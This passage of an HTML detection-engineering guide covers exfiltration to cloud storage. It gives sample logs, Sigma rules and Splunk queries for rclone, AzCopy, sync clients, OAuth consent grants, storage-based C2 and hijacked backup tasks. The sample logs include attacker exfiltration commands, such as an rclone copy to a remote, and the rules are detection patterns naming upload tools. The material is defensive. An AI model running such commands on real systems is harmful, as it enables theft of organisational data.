+          <li><code>Image</code> / <code>OriginalFileName</code> &mdash; where rclone ran from; <code>C:\Users\Public</code> is a strong staging hint.</li>
+          <li><code>CommandLine</code> &mdash; the provider remote (<code>mega:</code>), the custom <code>--config</code> path, transfer count and rate limit: the attacker&rsquo;s whole plan in one string.</li>
+          <li><code>User</code> &mdash; a service account (<code>svc_backup</code>) running interactive tools is itself suspicious.</li>
+          <li><code>ParentImage</code> &mdash; cmd.exe parent shows human or script-driven execution, not a scheduled job.</li>
+        </ul>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 2</span> azcopy / aws cli to attacker-owned storage</h4>
+        <p><strong>Log sources and key fields:</strong> Sysmon Event ID 1 (Image, CommandLine), proxy logs (cs_host, cs_uri_path, cs_uri_query, c_useragent, sc_bytes), Azure storage platform logs (SAS token issuance and use: <code>generateSasToken</code> operations, account, principal), and DNS. Watch for SAS query strings (<code>sig=</code>, <code>sv=</code>, <code>srt=o</code>) moving off your tenant.</p>
+        <p><strong>Normal:</strong> azcopy used by storage admins to known corporate accounts; aws <code>s3 cp</code> to company buckets. <strong>Suspicious:</strong> uploads to accounts created days ago, SAS signatures with long validity hitting unknown containers, and byte counts far above any job definition. <strong>Detection logic:</strong> correlate the process line with the proxy destination. Flag uploads to storage accounts that are not on the sanctioned list or that were never seen in the last 30 days.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Proxy record · azcopy PUT to attacker blob (key=value)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-log">_ts=2025-11-18T03:41:02Z  src=10.20.4.11  dst=20.60.34.17  cs_method=PUT
+cs_host=mydatahub1777.blob.core.windows.net  cs_uri_path=/staging/arc.7z
+cs_uri_query=sv=2022-11-02%26ss=b%26srt=o%26sig=REDACTED  sc_bytes=734003200
+c_useragent=AzCopy/10.20.1  root_domain=blob.core.windows.net
+url_category=uncategorized  app=Microsoft Azure</code></pre>
+        </div>
+        <ul>
+          <li><code>cs_host</code> &mdash; a tenant name (<code>mydatahub1777</code>) that does not belong to your organization.</li>
+          <li><code>cs_uri_query</code> &mdash; SAS parameters (<code>sv</code> version, <code>ss=b</code> blob scope, <code>sig</code> signature) proving shared-key access.</li>
+          <li><code>sc_bytes</code> &mdash; 700 MB in one request; multiplied across the night this becomes gigabytes.</li>
+          <li><code>c_useragent</code> &mdash; AzCopy identifies itself by default; the version string also dates the tooling.</li>
+        </ul>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 3</span> Native sync client abuse</h4>
+        <p><strong>Log sources and key fields:</strong> vendor sync-client logs and EDR process data (client version, account email), CASB app-activity events (user, app, activity, files, bytes, managed/unmanaged), and the provider&rsquo;s own audit API (OneDrive/SharePoint or Dropbox events: file downloaded, shared, uploaded). The per-user upload volume over time is the anchor field.</p>
+        <p><strong>Normal:</strong> steady, user-sized sync traffic tied to work hours and business accounts. <strong>Suspicious:</strong> personal-account sync on a corporate device, a folder dump of thousands of files in minutes, or sync volume 10&ndash;50× the user&rsquo;s 30-day norm. <strong>Detection logic:</strong> baseline upload bytes and file counts per user and alert on large deviations, with a separate high-severity path when the destination is a personal (unmanaged) account.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">CASB event · sync volume anomaly (JSON)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-json">{
+  "timestamp": "2025-11-18T04:02:11Z",
+  "product": "casb",
+  "event_type": "app_activity",
+  "app": "OneDrive for Business",
+  "app_category": "cloud-storage",
+  "managed_app": true,
+  "traffic_type": "managed",
+  "user": "m.reyes@corp.lab",
+  "device": "LAP-FIN-2291",
+  "src_ip": "10.20.9.42",
+  "activity": "file_upload",
+  "files": 38,
+  "bytes": 610000000,
+  "alert": "volume_anomaly: 38 uploads in 5 minutes, 610 MB"
+}</code></pre>
+        </div>
+        <ul>
+          <li><code>app</code> / <code>managed_app</code> &mdash; which provider and whether the org sanctions it on this device.</li>
+          <li><code>user</code> / <code>device</code> &mdash; the identity anchor for baselining; join with HR data for role context.</li>
+          <li><code>files</code> / <code>bytes</code> &mdash; the anomaly pair: many files and many megabytes in a short window.</li>
+          <li><code>alert</code> &mdash; the CASB&rsquo;s own anomaly verdict, useful for ranking but not sufficient alone.</li>
+        </ul>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 4</span> Malicious OAuth app granted drive access</h4>
+        <p><strong>Log sources and key fields:</strong> Azure AD / Entra ID (Microsoft&rsquo;s cloud identity service) audit logs (Operation &ldquo;Consent to application&rdquo;, initiatedBy, targetResources, scopes), Microsoft Graph API activity per application id, Okta system log (app user consent events), and CASB SaaS visibility. Key fields: consenting user, client app id, requested scopes, consent source IP.</p>
+        <p><strong>Normal:</strong> consents to vetted first-party apps, often triggered by admin; scopes limited to profile and basic reads. <strong>Suspicious:</strong> user-initiated consent to unknown multi-tenant apps requesting <code>Files.Read.All</code>, <code>Sites.Read.All</code> or mail scopes, especially followed by high-volume Graph calls from hosting-provider IPs. <strong>Detection logic:</strong> alert on any consent where the app is not in the approved register and the scopes include broad read or write permissions. Then review the app&rsquo;s subsequent API volume.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Entra ID audit · consent to application (JSON)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-json">{
+  "time": "2025-11-18T09:14:22Z",
+  "category": "AuditEvent",
+  "operationName": "Consent to application",
+  "result": "success",
+  "initiatedBy": { "user": { "userPrincipalName": "j.hart@corp.lab",
+                             "ipAddress": "203.0.113.44" } },
+  "targetResources": [ { "id": "8f0d2b7a-1c44-4e1f-9a2b-77d0c3aa51e9",
+                         "displayName": "FileSync Pro", "type": "Application" } ],
+  "additionalDetails": [ { "key": "scopes",
+                           "value": "Files.Read.All, Sites.Read.All, User.Read" } ]
+}</code></pre>
+        </div>
+        <ul>
+          <li><code>operationName</code> &mdash; the consent event itself; the moment the attacker gains API reach.</li>
+          <li><code>initiatedBy.user.ipAddress</code> &mdash; a non-corporate IP here means the consent page came to the user, not the app to the business.</li>
+          <li><code>targetResources.id</code> &mdash; the application id; pivot on it to see every later Graph call.</li>
+          <li><code>scopes</code> &mdash; <code>Files.Read.All</code> plus <code>Sites.Read.All</code> equals tenant-wide file read: the blast radius.</li>
+        </ul>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 5</span> RAT / cloud C2 with staging in storage buckets</h4>
+        <p><strong>Log sources and key fields:</strong> DNS logs (client, query, qtype, answer), proxy logs (cs_method, cs_host, cs_uri_path, bytes in/out), and EDR network events (process to destination mapping). The object prefix in the URI path is the identifier: implants reuse the same prefix for polling.</p>
+        <p><strong>Normal:</strong> humans access provider APIs at working hours with varied paths; sync traffic is bulky and bursty. <strong>Suspicious:</strong> a server-side process performing metronome-regular PUT/GET requests (the storage API&rsquo;s upload and download calls) to one object prefix, around the clock, with tiny payloads and no human interaction. <strong>Detection logic:</strong> group storage-endpoint traffic by source host and URI prefix, then flag low-and-slow periodic patterns &mdash; many small requests at fixed intervals is C2 behavior, not sync.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">DNS log · periodic lookups to a storage endpoint</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-log">2025-11-18T02:58:31Z  client=10.20.4.11  query=corpbackup123.blob.core.windows.net  qtype=A  answer=20.60.34.17  ttl=300  rcode=NOERROR
+2025-11-18T03:04:12Z  client=10.20.4.11  query=corpbackup123.blob.core.windows.net  qtype=A  answer=20.60.34.17  ttl=300  rcode=NOERROR
+2025-11-18T03:10:02Z  client=10.20.4.11  query=corpbackup123.blob.core.windows.net  qtype=A  answer=20.60.34.17  ttl=300  rcode=NOERROR</code></pre>
+        </div>
+        <ul>
+          <li><code>client</code> &mdash; a file server that should resolve only internal and update domains.</li>
+          <li><code>query</code> &mdash; the same unknown tenant name every ~5 minutes: beacon-like periodicity.</li>
+          <li><code>answer</code> &mdash; a single stable address; pair with proxy PUT records to the same host to confirm the channel.</li>
+        </ul>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 6</span> Backup tooling repurposed for mass upload</h4>
+        <p><strong>Log sources and key fields:</strong> Windows Security Event ID 4698/4699 (scheduled task created/deleted: TaskName, TaskContent, SubjectUserName), backup vendor audit logs (job definition changes, target change), Sysmon Event ID 1 for the job&rsquo;s child processes, and proxy volume for the host. The job definition diff is the core evidence.</p>
+        <p><strong>Normal:</strong> backup jobs change rarely, through change tickets, and point at the documented repository. <strong>Suspicious:</strong> a task created or edited outside change windows, referencing upload CLIs or new remote targets, running at unusual hours, or a backup service account suddenly generating internet uploads. <strong>Detection logic:</strong> alert on task or job-definition creation whose content references upload tools or new external targets, and require a matching change ticket for anything that alters the backup destination.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Windows Security 4698 · task created to run an uploader (XML)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-xml">&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"&gt;
+  &lt;System&gt;
+    &lt;EventID&gt;4698&lt;/EventID&gt;
+    &lt;TimeCreated SystemTime="2025-11-18T22:40:03.117Z" /&gt;
+    &lt;Computer&gt;FS01.corp.lab&lt;/Computer&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name="SubjectUserName"&gt;svc_backup&lt;/Data&gt;
+    &lt;Data Name="TaskName"&gt;\Maintenance\NightlyBackup&lt;/Data&gt;
+    &lt;Data Name="TaskContent"&gt;C:\Users\Public\rclone.exe copy C:\ShareExport remote:archive -q&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;</code></pre>
+        </div>
+        <ul>
+          <li><code>TaskName</code> &mdash; a friendly name mimicking maintenance; check it against real backup job inventories.</li>
+          <li><code>SubjectUserName</code> &mdash; the backup service account creating tasks is normal; the content is what matters.</li>
+          <li><code>TaskContent</code> &mdash; the embedded command names rclone from a public folder and a generic remote: the repurposing in plain text.</li>
+          <li><code>TimeCreated</code> &mdash; 22:40, outside change windows; pair with the change-ticket system for the verdict.</li>
+        </ul>
+        <h3 id="sec-5-5-rules" class="sec-sub"><span class="sub-id">5.5</span> Sigma Rules and Splunk SPL</h3>
+        <p>One detection package per threat from 5.3: a complete Sigma rule (all thirteen keys, ready for any converter), a matching Splunk SPL (Search Processing Language) query, the mapping rationale, expected false positives, and tuning guidance. The UUIDs (unique identifiers) are invented for this guide and stable &mdash; do not reuse them for other rules. Index and sourcetype names are realistic defaults; <strong>always adapt them to your own environment</strong> before deploying.</p>
+        <div class="callout note">
+          <span class="callout-label">Note · Reading the rules</span>
+          <p>Sigma conditions use the standard grammar (<code>1 of selection_*</code>, aggregations with <code>count() by</code> and a <code>timeframe</code>). SPL queries assume the stated field names; where your schema differs (for example <code>bytes</code> instead of <code>sc_bytes</code>), change the field, not the logic.</p>
+        </div>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 1a</span> Rclone execution &mdash; Sigma (process creation)</h4>
+        <p><strong>Mapping:</strong> the single highest-value endpoint signal for the pre-ransomware pattern. First-seen execution of rclone on any host is rare in most estates and appears in C0015, Akira and Conti-style reporting.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · rclone execution</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Rclone Command-Line Tool Execution
+id: 0f07b381-6e16-401d-a9c3-ec60c3e9f9be
+status: stable
+description: &gt;-
+  Detects execution of rclone, the tool most commonly abused for bulk exfiltration
+  to cloud storage services such as Mega, Google Drive or attacker-owned S3 buckets.
+  rclone activity on servers hours before ransomware encryption is a known
+  pre-encryption pattern (see ATT&amp;CK C0015 and leaked ransomware playbooks).
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+  - https://rclone.org/docs/
+author: ATT&amp;CK Guide Project — detection engineering team
+date: 2025-11-20
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_image:
+    Image|endswith: '\rclone.exe'
+  selection_original:
+    OriginalFileName|endswith: 'rclone.exe'
+  condition: 1 of selection_*
+fields:
+  - Image
+  - CommandLine
+  - OriginalFileName
+  - ParentImage
+  - User
+  - Hashes
+falsepositives:
+  - Administrators running approved rclone migrations. Maintain a baseline list of known hosts and service accounts and add them as a filter selection.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
+</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · rclone execution</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
+  (Image="*\\rclone.exe" OR OriginalFileName="*rclone.exe")
+| stats min(_time) AS first_seen, values(CommandLine) AS commands,
+        values(ParentImage) AS parents, count AS runs
+  by Computer, User
+| sort - first_seen</code></pre>
+        </div>
+        <p><strong>Field assumptions:</strong> Sysmon data lands in <code>index=sysmon</code> with the XML sourcetype above; <code>OriginalFileName</code> requires Sysmon 13.3+ (or FileHash via EventID 1 defaults). <strong>False positives:</strong> sanctioned migration projects; a scheduled copy job an admin forgot to register. <strong>Tuning:</strong> after a two-week observation window, suppress known-good host and account pairs, and add a companion filter for lab systems. <strong>Severity:</strong> high; critical when the same host also shows staging archives (rule 1b pattern plus proxy volume).</p>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 1b</span> rclone.conf creation &mdash; Sigma (file event)</h4>
+        <p><strong>Mapping:</strong> the config file proves the channel was armed. It is the brief&rsquo;s named companion signal to process first-seen and is cheap to detect with near-zero noise.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · rclone config file creation</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Rclone Config File Creation
+id: abbeb9fc-ec1f-467c-98dd-51d2e8a968ca
+status: stable
+description: &gt;-
+  Detects creation of the rclone configuration file rclone.conf. Legitimate rclone
+  setups are rare on servers, and a freshly written config on a host that never ran
+  rclone is a strong pre-exfiltration indicator, often written under a custom path
+  pointed to by the --config flag.
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+  - https://rclone.org/docs/#configuration
+author: ATT&amp;CK Guide Project — detection engineering team
+date: 2025-11-20
+logsource:
+  category: file_event
+  product: windows
+detection:
+  selection_main:
+    TargetFilename|endswith: '\rclone\rclone.conf'
+  selection_custom:
+    TargetFilename|endswith: 'rclone.conf'
+  condition: 1 of selection_*
+fields:
+  - TargetFilename
+  - Image
+  - ProcessGuid
+  - User
+falsepositives:
+  - Approved backup or migration tooling that wraps rclone. Inventory those hosts and exclude their known install paths.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
+</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · rclone.conf creation</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11
+  TargetFilename="*rclone.conf"
+| table _time, Computer, User, Image, TargetFilename, ProcessGuid
+| dedup Computer, TargetFilename</code></pre>
+        </div>
+        <p><strong>Field assumptions:</strong> same Sysmon index as above; <code>Image</code> identifies the writing process &mdash; join it to the rclone execution rule via <code>ProcessGuid</code>. <strong>False positives:</strong> a deliberate enterprise rclone deployment (rare; inventory it). <strong>Tuning:</strong> if your org officially uses rclone, scope the rule to servers and to non-standard config paths (anything outside the approved install). <strong>Severity:</strong> high on any server; medium on endpoints where developers may legitimately use it.</p>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 2</span> azcopy / aws cli uploads &mdash; Sigma (proxy) and SPL (volume)</h4>
+        <p><strong>Mapping:</strong> the strongest visible artifact of native-CLI theft is on the wire: the AzCopy user agent and SAS query strings leaving to a tenant that is not yours. The proxy sees what the endpoint never logs.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · azcopy uploads to non-corporate blob storage</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: AzCopy Upload to External Blob Storage
+id: 3da861fd-ba94-417a-b7a7-13de9ae437c4
+status: test
+description: &gt;-
+  Detects AzCopy upload traffic to Azure Blob Storage endpoints. AzCopy is a signed
+  Microsoft binary routinely abused to copy data to attacker-owned storage accounts
+  using a SAS token. Volume against unlisted tenants is the discriminator, so the
+  rule pairs the user agent with a request-size aggregation.
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+  - https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10
+author: ATT&amp;CK Guide Project — detection engineering team
+date: 2025-11-20
+logsource:
+  category: proxy
+detection:
+  selection_agent:
+    c-useragent|startswith: 'AzCopy/'
+  selection_host:
+    cs-host|endswith: '.blob.core.windows.net'
+  condition: selection_agent and selection_host | count() by src_ip &gt; 10
+  timeframe: 1h
+fields:
+  - src_ip
+  - cs-host
+  - cs-method
+  - cs-uri-path
+  - c-useragent
+  - bytes
+falsepositives:
+  - Large but legitimate migration or DR-drill uploads by the storage team. Exempt approved source ranges and tenants.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
+</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · azcopy volume to unknown tenants</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=proxy c_useragent="AzCopy/*" cs_host="*.blob.core.windows.net"
+| bin _time span=1h
+| stats count AS requests, values(cs_uri_path) AS paths
+        by src_ip, _time
+| where requests &gt; 10</code></pre>
+        </div>
+        <p><strong>Field assumptions:</strong> proxy fields use the common <code>cs_*</code> naming; the query mirrors the Sigma logic exactly &mdash; AzCopy user agent plus Blob Storage endpoint, binned into 1-hour windows, more than 10 requests from one source IP. <strong>Optional documented refinements</strong> (widen or narrow to taste, but keep them out of the base query so it stays equivalent to the rule): add <code>cs_host="*.file.core.windows.net"</code> for Azure Files, add <code>| regex cs_uri_query="(?i)(sig=|sv=)"</code> to keep only SAS-signed requests, and add <code>sum(bytes) AS bytes_out</code> with a floor such as <code>bytes_out &gt; 1000000000</code> for volume context. Maintain a lookup of sanctioned storage accounts (<code>| lookup approved_storage cs_host OUTPUT is_approved</code>) and add <code>| search NOT is_approved=true</code> in production. <strong>False positives:</strong> the storage team&rsquo;s own large copies; DR (disaster-recovery) drills. <strong>Tuning:</strong> whitelist by tenant name and source subnet, and keep any byte threshold per host class (servers tolerate higher values). <strong>Severity:</strong> high &mdash; unknown tenant plus AzCopy plus a request burst is the reported IR pattern.</p>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 3</span> Sync clients on servers &mdash; Sigma and SPL</h4>
+        <p><strong>Mapping:</strong> endpoint telemetry catches the client itself. Sync apps on servers are almost always wrong; on laptops the volume rule (5.4, threat 3) carries the detection instead.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · cloud storage sync client started on a server</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Cloud Storage Sync Client Started on a Server
+id: 6dcd95b8-6d9c-4db1-8bea-97c144eb886c
+status: test
+description: &gt;-
+  Detects Dropbox, MEGAsync or OneDrive clients starting on hosts that should run
+  none. An insider or malware can stage files into a synced folder and let the
+  trusted vendor client perform the exfiltration, which looks like normal sync
+  traffic on the wire.
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+author: ATT&amp;CK Guide Project — detection engineering team
+date: 2025-11-20
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_clients:
+    Image|endswith:
+      - '\dropbox.exe'
+      - '\megasync.exe'
+      - '\onedrive.exe'
+  condition: selection_clients
+fields:
+  - Image
+  - CommandLine
+  - User
+  - ParentImage
+falsepositives:
+  - OneDrive on standard user workstations is expected. Tune the rule to server and infrastructure host groups, or add a workstation filter for OneDrive.
+level: medium
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
+</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · sync client process starts</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
+  (Image="*\\dropbox.exe" OR Image="*\\megasync.exe" OR Image="*\\onedrive.exe")
+| stats min(_time) AS first_seen, max(_time) AS last_seen, count AS starts
+        by Computer, User, Image
+| sort - first_seen</code></pre>
+        </div>
+        <p><strong>Field assumptions:</strong> the base query mirrors the Sigma logic exactly &mdash; a process start of any of the three clients, on any host, with per-host counts. <strong>Documented production narrowing</strong> (it matches the rule&rsquo;s false-positive note, keep it as a filter on top, not in the base query): append <code>| lookup host_inventory hostname AS Computer OUTPUT device_role | search device_role IN ("server", "domain_controller", "database", "hypervisor")</code>; if you lack a lookup, filter with a server-naming convention or an asset tag field. <strong>False positives:</strong> OneDrive known-folder sync on workstations; admin testing. <strong>Tuning:</strong> keep Dropbox/MEGAsync global (they rarely belong anywhere), and restrict OneDrive alerting to server roles. <strong>Severity:</strong> medium on servers, high if paired with a personal (unmanaged) account in CASB data.</p>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 4</span> OAuth consent to storage scopes &mdash; Sigma and SPL</h4>
+        <p><strong>Mapping:</strong> there is no endpoint event in this scenario &mdash; the identity plane is the only witness. The consent audit event with broad file scopes is the detection.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · consent grant with broad file scopes</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: OAuth Consent Grant for Cloud Storage Scopes
+id: b6e5c331-8f16-47d4-84b2-2acac457e8a2
+status: test
+description: &gt;-
+  Detects a user consenting to an application that requests broad read scopes over
+  files and sites. Consent phishing yields tenant-wide drive access with no
+  endpoint artifact; the consent audit event is the primary detection point.
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+  - https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/consent-workflow
+author: ATT&amp;CK Guide Project — detection engineering team
+date: 2025-11-20
+logsource:
+  category: cloud
+  product: m365
+  service: azure.auditlogs
+detection:
+  selection_operation:
+    Operation: 'Consent to application'
+  selection_scopes:
+    ModifiedProperties|contains:
+      - 'Files.Read.All'
+      - 'Sites.Read.All'
+      - 'Drives.Read.All'
+      - 'Mail.Read'
+  condition: selection_operation and selection_scopes
+fields:
+  - Operation
+  - ModifiedProperties
+  - TargetResources
+  - initiatedBy
+  - IPAddress
+falsepositives:
+  - Approved third-party apps requesting file scopes (for example a documented DLP or e-signature tool). Maintain an approved-app register and filter its ids.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
+</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · consent events with file scopes</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=o365 sourcetype="o365:management:activity"
+  Workload=AzureActiveDirectory Operation="Consent to application"
+| spath input=ModifiedProperties
+| search ModifiedProperties="*Files.Read.All*"
+     OR ModifiedProperties="*Sites.Read.All*"
+     OR ModifiedProperties="*Drives.Read.All*"
+     OR ModifiedProperties="*Mail.Read*"
+| table _time, user, ClientIP, ObjectId, ModifiedProperties
+| rename user AS consenting_user, ObjectId AS app_object_id</code></pre>
+        </div>
+        <p><strong>Field assumptions:</strong> the <code>o365:management:activity</code> sourcetype with <code>spath</code> flattening the nested <code>ModifiedProperties</code> list; <code>ObjectId</code> holds the app&rsquo;s object id. Confirm extraction names in your environment &mdash; some tenants expose <code>TargetResources{}.ID</code> instead. <strong>False positives:</strong> sanctioned SaaS integrations. <strong>Tuning:</strong> enforce admin-consent workflow (mitigation, section 7) so this alert becomes rare and high-fidelity; correlate every hit with the app&rsquo;s subsequent Graph volume. <strong>Severity:</strong> high; critical if consent came from a non-corporate IP and Graph volume spikes within hours.</p>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 5</span> Beacon-style PUT/GET to object prefixes &mdash; Sigma (aggregation) and SPL</h4>
+        <p><strong>Mapping:</strong> implants reuse one object prefix and keep metronome time. Volume-based rules miss them; periodicity-and-count aggregations catch them.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · periodic PUTs to storage endpoints</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Periodic PUT Requests to Cloud Storage Endpoints
+id: a9f79e0b-9e0c-4dee-b2b4-fb9e30f184e9
+status: test
+description: &gt;-
+  Detects metronome-like PUT patterns against major cloud storage endpoints from a
+  single source, which indicates an implant using the storage service as a command
+  and exfiltration channel rather than a human syncing files.
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+author: ATT&amp;CK Guide Project — detection engineering team
+date: 2025-11-20
+logsource:
+  category: proxy
+detection:
+  selection_put:
+    cs-method: 'PUT'
+    cs-host|contains:
+      - 'mega.nz'
+      - 'blob.core.windows.net'
+      - 'storage.googleapis.com'
+      - 'dropbox'
+      - 's3.amazonaws.com'
+  condition: selection_put | count() by src_ip &gt; 30
+  timeframe: 10m
+fields:
+  - src_ip
+  - cs-host
+  - cs-uri-path
+  - bytes
+falsepositives:
+  - Legitimate automated backups and CI pipelines that push many small artifacts to storage. Baseline their source ranges and prefix paths.
+level: medium
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
+</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · request counts per host and prefix</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=proxy cs_method="PUT"
+  (cs_host="*mega.nz*" OR cs_host="*blob.core.windows.net"
+   OR cs_host="*storage.googleapis.com" OR cs_host="*dropbox*"
+   OR cs_host="*s3.amazonaws.com")
+| bin _time span=10m
+| stats count AS requests, values(cs_uri_path) AS prefixes
+        by src_ip, _time
+| where requests &gt; 30</code></pre>
+        </div>
+        <p><strong>Field assumptions:</strong> same proxy schema as threat 2; the query mirrors the Sigma logic exactly &mdash; PUT requests to the storage endpoints, binned into 10-minute windows, more than 30 requests from one source IP. <strong>Optional documented refinements:</strong> add <code>sum(bytes) AS bytes_out</code> plus <code>AND bytes_out &lt; 50000000</code> to keep the &ldquo;many small requests&rdquo; shape, and add <code>cs_host</code> to the <code>by</code> clause to isolate one victim prefix. <strong>False positives:</strong> artifact pushes from build and CI (continuous integration) servers. <strong>Tuning:</strong> adjust the count threshold to your backup cadence; add <code>cs-uri-path</code> prefix grouping if one victim prefix stands out. <strong>Severity:</strong> medium &mdash; steady loss, long dwell; escalate when the same host shows DNS periodicity from 5.4 threat 5.</p>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 6</span> Scheduled task referencing upload tools &mdash; Sigma and SPL</h4>
+        <p><strong>Mapping:</strong> repurposed backup jobs betray themselves at creation time. Windows records the full task definition in Event 4698 &mdash; including the embedded command line.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · task creation referencing upload tools</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Scheduled Task Creation Referencing Upload Tools
+id: a63a929a-6454-4598-999a-e263ff24e7ee
+status: stable
+description: &gt;-
+  Detects Windows scheduled task creations (Event 4698) whose task content
+  references common upload tools such as rclone, azcopy, MEGAsync or Dropbox.
+  Attackers repurpose backup schedules so mass uploads are accepted as normal
+  backup traffic; the task definition exposes the trick.
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698
+author: ATT&amp;CK Guide Project — detection engineering team
+date: 2025-11-20
+logsource:
+  product: windows
+  service: security
+detection:
+  selection_event:
+    EventID: 4698
+  selection_content:
+    TaskContent|contains:
+      - 'rclone'
+      - 'azcopy'
+      - 'megasync'
+      - 'dropbox'
+  condition: selection_event and selection_content
+fields:
+  - EventID
+  - TaskName
+  - TaskContent
+  - SubjectUserName
+  - SubjectDomainName
+falsepositives:
+  - Documented backup or sync jobs that genuinely wrap these tools. Require a change ticket reference in the task name for approved jobs.
+level: medium
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
+</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · task creation with upload tools</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=wineventlog sourcetype="WinEventLog:Security" EventCode=4698
+| regex TaskContent="(rclone|azcopy|megasync|dropbox)"
+| table _time, Computer, SubjectUserName, TaskName, TaskContent
+| sort - _time</code></pre>
+        </div>
+        <p><strong>Field assumptions:</strong> standard Security log forwarding into <code>index=wineventlog</code>; <code>TaskContent</code> is extracted by default Splunk Windows TA parsing. The regex mirrors the Sigma&rsquo;s four case-sensitive <code>contains</code> values; for a wider, case-insensitive hunt use <code>(?i)(rclone|azcopy|megasync|dropbox|aws\.exe)</code> as a documented expansion. <strong>False positives:</strong> approved jobs using these tools &mdash; rare, and easy to inventory. <strong>Tuning:</strong> pair the alert with the change-ticket system: any hit without a matching ticket is an incident, any hit with one is auditable change. <strong>Severity:</strong> medium on servers; upgrade to high when the task runs under a backup service account and proxy volume for that host rises in the same window.</p>
+
+        <div class="callout practice">
+          <span class="callout-label">Good practice · Test before you trust</span>
+          <p>Replay the section 2 story in your lab (a VM plus a local S3 emulator is enough) and confirm each rule fires: process first-seen, config file, volume break, task creation. Purple-team the rules quarterly &mdash; detection content that has never fired in a test will not fire in an incident either.</p>
+        </div>
+      </section>
+      <section id="sec-6-case-study" class="content-section">
+        <div class="section-head">
+          <span class="section-num">6</span>
+          <h2>Real-World Case Study: GoldenJackal</h2>
+          <p class="section-intro">An espionage actor that combined USB worms with Google Drive exfiltration against government networks &mdash; proof that this technique is not only a ransomware problem.</p>
+        </div>
